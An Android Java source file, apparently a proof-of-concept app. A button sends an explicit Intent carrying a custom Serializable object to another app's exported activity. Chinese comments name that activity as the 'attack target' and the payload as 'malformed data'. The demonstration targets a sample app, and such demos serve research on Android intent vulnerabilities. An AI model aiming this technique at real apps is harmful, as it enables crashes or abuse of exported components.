package com.example.zhou.intentbug;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    private Button mIntentBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mIntentBtn=(Button)findViewById(R.id.intent_bug_btn);
        mIntentBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=new Intent();
                intent.setAction("android.intent.action.INTENTBUG");
                intent.setClassName("com.example.zhou.catchdata", "com.example.zhou.catchdata.MainActivity");
                // 指定攻击目标的包名和Activity入口
                intent.putExtra("serializable_obj",new MySerialClass());
//                intent.putExtra("serializable_obj","这是一个字符串");
                //此处是传入畸形数据
                startActivity(intent);
            }
        });
    }
}
